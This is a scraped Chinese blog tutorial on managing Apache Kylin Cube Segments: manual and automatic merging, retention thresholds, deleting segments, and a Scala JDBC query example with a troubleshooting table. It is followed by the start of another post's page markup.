data-v-61fb5e44="">
            大数据-163 Apache Kylin Segment 合并实战：手动/自动合并、保留策略与 JDBC 示例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:49:27.000Z" title="Tue Nov 25 2025 00:49:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：Cube 被频繁增量构建导致 Segment 碎片增多、查询降速与存储膨胀。</li>
<li>结论：低峰期用手动 MERGE 兜底；长期用 Auto Merge + Retention 阈值自动治理；删除需先 Disable 再 Delete。</li>
<li>产出：完整操作清单、阈值策略案例、删除流程、JDBC 连接示例与错误速查卡。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bdcbc872f85401bb3c0c67429844c49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=wg1Wf7u%2BzVdN1XExwKmH0%2FS0Qpc%3D" alt="大数据-163 Apache Kylin Segment 合并实战：手动/自动合并、保留策略与 JDBC 示例" loading="lazy"/></p>
<h2 data-id="heading-1">版本矩阵</h2>



































<table><thead><tr><th>项目/能力</th><th>已验证</th><th>说明</th></tr></thead><tbody><tr><td>手动合并（Web UI：Segments → Merge Segment）</td><td>是（Kylin 3.1.1）</td><td>仅支持连续且 READY 的 Segments，提交后生成 MERGE Job，期间禁止并发其他构建任务。</td></tr><tr><td>自动合并（Auto Merge Thresholds）</td><td>是（Kylin 3.1.1）</td><td>新 Segment 进入 READY 触发检查，从最大阈值向下尝试；示例含 7/28 天策略。</td></tr><tr><td>保留策略（Retention Threshold）</td><td>是（Kylin 3.1.1）</td><td>依据“各 Segment 结束时间”与“最新结束时间”的差值决定清理。</td></tr><tr><td>删除 Segment（Disable → Delete）</td><td>是（Kylin 3.1.1）</td><td>必须先 Disable 才能 Delete；Delete 后回收存储资源。</td></tr><tr><td>JDBC 连接与查询示例</td><td>是（kylin-jdbc 3.1.1）</td><td>依赖坐标与连接串示例已给出，可直接执行聚合查询。</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7993abc395164060817ed59b75722755~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=gE%2Fxe5kAoEIM2U0N4fig0jtxq2k%3D" alt="Apache Kylin" loading="lazy"/></p>
<h2 data-id="heading-2">基本流程</h2>
<p>在 Apache Kylin 中，手动触发 Segment 合并的步骤如下：</p>
<ul>
<li>
<p>选择要合并的 Cube 和 Segments： 进入 Kylin Web UI，选择你要操作的 Cube，进入该 Cube 的详情页面。在“Segments”标签页下，可以看到当前 Cube 的所有 Segments。选择你希望合并的 Segments。</p>
</li>
<li>
<p>合并 Segments： 点击页面上的 “Merge Segment” 按钮。通常情况下，Kylin 会自动计算可以合并的 Segments。如果你想手动控制合并的 Segments，可以在弹出的对话框中手动选择你想合并的 Segments。</p>
</li>
<li>
<p>配置合并任务： 配置合并任务的参数，如目标时间范围等。Kylin 会根据你选择的 Segments 的范围自动填充一些默认的值。你可以根据需求调整这些参数。</p>
</li>
<li>
<p>启动合并任务： 完成配置后，点击 “Submit” 按钮。Kylin 将会创建一个新的合并任务（Job），该任务将在后台执行。你可以在 "Job" 页面查看任务的执行状态。</p>
</li>
<li>
<p>监控任务状态： 在 "Job" 页面，你可以查看合并任务的日志和状态。如果任务执行成功，你会看到新的 Segment 出现在 Segments 列表中，表示合并已经完成。</p>
</li>
<li>
<p>如果合并成功，新的合并后 Segment 会替代原来的多个 Segments，而旧的 Segments 将被 Kylin 自动清理。</p>
</li>
</ul>
<p>需要注意的是，手动合并的操作可能会占用大量资源，因此在高负载时需要谨慎操作，并在合适的时间段执行合并任务。</p>
<h2 data-id="heading-3">手动触发合并Segment</h2>
<p>Kylin提供了一种简单的机制用于控制Cube中Segment的数量：合并Segment，在WebGUI中选中需要进行Segments合并的Cube。</p>
<h2 data-id="heading-4">单击Action =&gt; Merge</h2>
<p>我们刚才分阶段进行了任务的Build操作，
01-01、01-02、01-03、01-04 的任务，我们可以使用 Merge 来进行合并：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f918a69cfc1b4b769062fbe0767996a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=ONmlCuYUP%2F4XUeEEtZZTFUKb9Dc%3D" alt="单击Action =&gt; Merge" loading="lazy"/></p>
<p>选中需要合并的Segment，可以同时合并多个Segment，但这些Segment必须是连续的，单击提交系统会提交一个类型为 MERGE 的构建任务，这里可以选择时间阶段，我选择的是 01-03到01-04：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bd8bd6b4ec543a9852318ca7a30c220~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=4f3EX%2FlMWT6a1rjh%2FSNngC86zNE%3D" alt="Cube Merge Confirm" loading="lazy"/></p>
<p>提交任务，可以看到是一个 Merge任务，看名字：【MERGE】，等待合并完毕：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4d5c2d3f9c8437aa72af3d4fbda136c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=KnZc4KAn12vO%2B2hOw2OuQvG7iWE%3D" alt="Cube Jobs" loading="lazy"/>
合并完毕的结果如下图：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b9d7a3d0e84c23a0276e5a97e2b0b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=%2FYiEqLiO99GZNNAYqVVZEqBK7ZQ%3D" alt="Cube Jobs 执行结果" loading="lazy"/></p>
<h3 data-id="heading-5">注意事项</h3>
<ul>
<li>在MERGE构建结束之前，所有选中用来合并的Segment仍然处于可用的状态</li>
<li>在MERGE类型的构建完成之前，系统将不允许提交这个Cube上任何类型的其他构建任务</li>
<li>当MERGE构建结束的时候，系统将选中合并的Segment替换为新的Segment，而被替换下的Segment等待将被垃圾回收和清理，以节省系统资源</li>
</ul>
<h2 data-id="heading-6">删除Segment</h2>
<p>使用WebUI删除Cube的Segment，
这里选择 Disable 就可以删除Segment了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1dc35f6eea44c478e71708f34495223~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=vFG5T%2FMycawLMA6oGO6lrcYqZkg%3D" alt="删除Segment" loading="lazy"/>
Disable之后，可以看到下面的：DeleteSegment操作，就可以删除指定的Segment了：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/263deb2ba02e46e181939f15199d8086~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=F2HfQ3U7vedXy7vfl%2BEa5itwU18%3D" alt="Cube DeleteSegment" loading="lazy"/></p>
<h2 data-id="heading-7">自动合并</h2>
<p>手动维护Segment很繁琐，人工成本高，Kylin中是可以支持自动合并Segment。
在Cube Designer的 Refresh Settings的页面中有：</p>
<ul>
<li>Auto Merge Thresholds</li>
<li>Retention Thresholds</li>
</ul>
<p>Refresh Settings的页面：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f881a7450bf141d98ae852fc5daf5ca2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=CxFlsKfyKj2wAjEqXjc6G5nGZjI%3D" alt="Cube Designer" loading="lazy"/>
两个设置项可以用来帮助管理Segment碎片，这两项设置搭配使用这两项设置可以大大减少对Segment进行管理的麻烦。</p>
<h2 data-id="heading-8">Auto Merge Thresholds</h2>
<ul>
<li>允许用户设置几个层级的时间阈值，层级越靠后，时间阈值越大</li>
<li>每当Cube中有新的Segment状态变为READY的时候，就会自动触发一次系统自动合并</li>
</ul>
<h2 data-id="heading-9">合并策略</h2>
<ul>
<li>尝试最大一级的时间阈值，例如：针对（7天、28天）层级的日志，先检查能够将连续的若干个Segment合并成为一个超过28天的大Segment</li>
<li>如果有个别的Segment的事件长度本身已经超过28天，系统会跳过Segment</li>
<li>如果满足条件的连续Segment还不能够累积超过28天，那么系统会使用下一个层级的时间戳重复寻找</li>
</ul>
<h2 data-id="heading-10">案例1 理解Kylin自动合并策略</h2>
<ul>
<li>假设自动合并阈值设置为7天、28天</li>
<li>如果现在有A-H 8个连续的Segment，它们的时间长度为28天（A）、7天（B）、1天（C）、一天（D）、一天（E）、一天（F）、一天（G）、一天（H）</li>
<li>此时，第9个Segment加入，时间长度为1天</li>
</ul>
<p>自动合并的策略为：</p>
<ul>
<li>Kylin判断时能够将连续的Segment合并到28天这个阈值，由于Segment A已经超过28天，会被排除。</li>
<li>剩下的连续Segment，所有时间加一起 B+C+D+E+F+G+H+I &lt; 28天，无法满足28天的阈值，则开始尝试7天的阈值</li>
<li>跳过 A（28）、B（7）均超过7天，排除</li>
<li>剩下的连续Segment，所有时间加在一起 C+D+E+F+G+H+I 达到7天的阈值，触发合并，提交Merge任务，并构建一个SegmentX（7天）</li>
<li>合并后，Segment为：A（28天）、B（7天）、X（7天）</li>
<li>连续触发检查，A（28天）跳过，B+X（7+7=14）&lt; 28天，不满足第一阈值，重新使用第二阈值触发</li>
<li>跳过B、X尝试终止</li>
</ul>
<h2 data-id="heading-11">案例2 配置自动合并4天的Segment</h2>
<p>选中Model，选择Edit进行编辑：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd35551485d345f38705c723d9c9225f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=xvvaUQxhTpdgVVizcaLZW%2BXvuTE%3D" alt="Segment Cube Model" loading="lazy"/>
直接到Refresh Setting选项卡，将选项修改为，4天：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1794937308584b218fa03d67b3fd265a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=HkfA5HsGV8hyz0whtbrYJxzTh%2BI%3D" alt="Cube Refresh Setting" loading="lazy"/>
后续将自动进行Segment的构建。</p>
<h2 data-id="heading-12">配置保留的Segment</h2>
<p>自动合并是将多个Segment合并为一个Segment，以达到清理碎片的目的，保留Segment则是及时清理不再使用的Segment。
在很多场景中，只会对过去一段时间内的数据进行查询，例如：</p>
<ul>
<li>对于某个只显示过去1年数据的报表</li>
<li>支持它的Cube其实只需要保留过去一年类的Segment即可</li>
<li>由于数据在Hive中已经存在备份，则不需在Kylin中备份超过一年的类似数据</li>
</ul>
<p>可以将Retention Threshold设置为365，每当有新的Segment状态变为READY的时候，系统会检查每一个Segment。如果它的结束时间距离最晚的一个Segment的结束时间已经大于等于RetentionThreshold，那么这个Segment将视为无需保留，系统会自动从Cube中删除这个Segment。</p>
<p>保留策略示意图如下所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5757bbb9b5934a8f9a6605f38a541271~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=AZHv302KEM5dlQfD%2B%2BAFf4igV5s%3D" alt="Retention Threshold" loading="lazy"/></p>
<h2 data-id="heading-13">使用JDBC连接操作Kylin</h2>
<h3 data-id="heading-14">简单介绍</h3>
<ul>
<li>要将数据以可视化方式展示出来，需要使用Kylin的JDBC方式连接执行SQL，获取Kylin的执行结果</li>
<li>使用Kylin的JDBC与JDBC操作MySQL一致</li>
</ul>
<h3 data-id="heading-15">业务需求</h3>
<p>通过JDBC的方式，查询按照日期、区域、产品维度统计订单总额/总数量结果</p>
<h3 data-id="heading-16">开发步骤</h3>
<h4 data-id="heading-17">添加依赖</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.kylin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kylin-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-18">实现规划</h4>
<ul>
<li>创建Connection连接对象</li>
<li>构建SQL语句</li>
<li>创建Statement对象，并执行executeQuery</li>
<li>打印结果</li>
</ul>
<h4 data-id="heading-19">编写代码</h4>
<p>我这里用Scala实现了，Java也差不多</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> icu.wzk.kylin

<span class="hljs-keyword">import</span> java.sql.DriverManager

object KylinJdbcTest {

  def <span class="hljs-title function_">main</span><span class="hljs-params">(args: Array[String])</span>: Unit = {
    <span class="hljs-comment">// 创建连接对象</span>
    <span class="hljs-type">val</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">"jdbc:kylin://h122.wzk.icu:7070/wzk_test_kylin"</span>, <span class="hljs-string">"ADMIN"</span>, <span class="hljs-string">"KYLIN"</span>)
    <span class="hljs-comment">// 创建Statement</span>
    <span class="hljs-type">val</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();
    <span class="hljs-comment">// 构建SQL语句</span>
    <span class="hljs-type">var</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span>
      <span class="hljs-string">"""
        |select
        | t1.dt,
        | t2.regionid,
        | t2.regionname,
        | t3.productid,
        | t3.productname,
        | sum(t1.price) as total_money,
        | sum(t1.amount) as total_amount
        |from
        | dw_sales1 t1
        |inner join dim_region t2
        |on t1.regionid = t2.regionid
        |inner join dim_product t3
        |on t1.productid = t3.productid
        |group by
        | t1.dt,
        | t2.regionid,
        | t2.regionname,
        | t3.productid,
        | t3.productname
        |order by
        | t1.dt,
        | t2.regionname,
        | t3.productname
        |"""</span>.stripMargin
    <span class="hljs-type">val</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql)
    println(<span class="hljs-string">"dt region product_name total_money total_amount"</span>)
    <span class="hljs-keyword">while</span> (resultSet.next()) {
      <span class="hljs-comment">// 获取时间</span>
      <span class="hljs-type">val</span> <span class="hljs-variable">dt</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">"dt"</span>)
      <span class="hljs-comment">// 获取区域名称</span>
      <span class="hljs-type">val</span> <span class="hljs-variable">regionName</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">"regionname"</span>)
      <span class="hljs-comment">// 获取产品名称</span>
      <span class="hljs-type">val</span> <span class="hljs-variable">productName</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">"productname"</span>)
      <span class="hljs-comment">// 获取累计金额</span>
      <span class="hljs-type">val</span> <span class="hljs-variable">totalMoney</span> <span class="hljs-operator">=</span> resultSet.getDouble(<span class="hljs-string">"total_money"</span>)
      <span class="hljs-comment">// 获取累计数量</span>
      <span class="hljs-type">val</span> <span class="hljs-variable">totalAmount</span> <span class="hljs-operator">=</span> resultSet.getDouble(<span class="hljs-string">"total_amount"</span>)
      println(f<span class="hljs-string">"$dt $regionName $productName $totalMoney $totalAmount"</span>)
    }
    connection.close()
  }

}

</code></pre>
<h4 data-id="heading-20">测试运行</h4>
<p>我们运行代码，可以看到如下的运行结果：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c6eb41cd69248e99c64a78a8786b93d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636566&amp;x-signature=E91Zi%2Bh64cstZ2NfaofOHci3nBw%3D" alt="Kylin Cube Java 连接并执行" loading="lazy"/></p>
<h2 data-id="heading-21">错误速查</h2>







































































<table><thead><tr><th>症状</th><th>根因</th><th>定位</th><th>修复</th></tr></thead><tbody><tr><td>Merge 按钮灰掉/不可选</td><td>选中的 Segments 非连续或状态非 READY</td><td>查看 Segments 状态与时间范围是否连续</td><td>仅选择连续且 READY 的 Segments；等待构建完成后再合并</td></tr><tr><td>提交 MERGE 失败</td><td>集群资源不足/队列限额/权限不足</td><td>Job 日志、YARN/Spark UI、Kylin Server 日志</td><td>降低并发/切低峰执行；调整队列/Executor；补齐角色权限</td></tr><tr><td>MERGE Job 长时间卡住</td><td>后端引擎资源瓶颈（HBase RegionBusy / Spark Executor 不足）</td><td>RegionServer 日志、Spark Executor 指标</td><td>扩容/调大 Executor 与并行度；分时段执行；检查数据倾斜</td></tr><tr><td>合并后查询结果异常（缺失/重复）</td><td>合并时间边界选错、维表未对齐</td><td>对比旧/新 Segment 时间边界与维表快照</td><td>重新按正确时间范围合并；必要时回滚并重建</td></tr><tr><td>无法删除 Segment</td><td>未先 Disable；有依赖作业进行中</td><td>UI 状态/任务面板</td><td>先 Disable，确认无运行任务后再 Delete</td></tr><tr><td>Auto Merge 不生效</td><td>阈值过大/单位误解；新 Segment 未到 READY</td><td>刷新设置与最新 Segment 状态</td><td>调整阈值（天/小时一致）；等待 READY 或手动触发一次小合并</td></tr><tr><td>Retention 未清理</td><td>阈值与最新结束时间差未达标/无新 READY 触发</td><td>校验各 Segment 结束时间与阈值</td><td>降低阈值；在低峰增量一次触发自动清理</td></tr><tr><td>JDBC 连接失败</td><td>驱动版本不匹配/URL/端口/认证问题</td><td>客户端异常与 Kylin Server 日志</td><td>使用与服务端匹配的 kylin-jdbc 版本；核对 jdbc:kylin://host:7070/project 与账号</td></tr><tr><td>JDBC 查询很慢</td><td>未命中 Cube/模型不匹配/维度基数高</td><td>Kylin 查询计划与命中信息</td><td>调整 SQL 以命中预计算；优化模型维度与聚合度；必要时新增 Segment</td></tr><tr><td>MERGE 后磁盘未下降</td><td>旧 Segment 未回收/垃圾回收延迟</td><td>HDFS 使用与 Kylin 元数据</td><td>等待 GC；执行维护任务；确认 Delete 已完成并刷新元数据</td></tr></tbody></table>
<h2 data-id="heading-22">其他系列</h2>
<h3 data-id="heading-23">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-127 Qwen2.5-Omni 深解：Thinker-Talker 双核、TMRoPE 与流式语音</strong></p>
<h3 data-id="heading-24">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-174 FastFDS 从单机到分布式文件存储：实战与架构取舍</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 正在更新，深入浅出助你打牢基础！</p>
<h3 data-id="heading-25">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[linux系统，常见端口介绍]]></title>    <link>https://juejin.cn/post/7576155790164967475</link>    <guid>https://juejin.cn/post/7576155790164967475</guid>    <pubDate>2025-11-25T00:52:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576155790164967475" data-draft-id="7576105442214445106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="linux系统，常见端口介绍"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-25T00:52:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            linux系统，常见端口介绍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:52:19.000Z" title="Tue Nov 25 2025 00:52:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
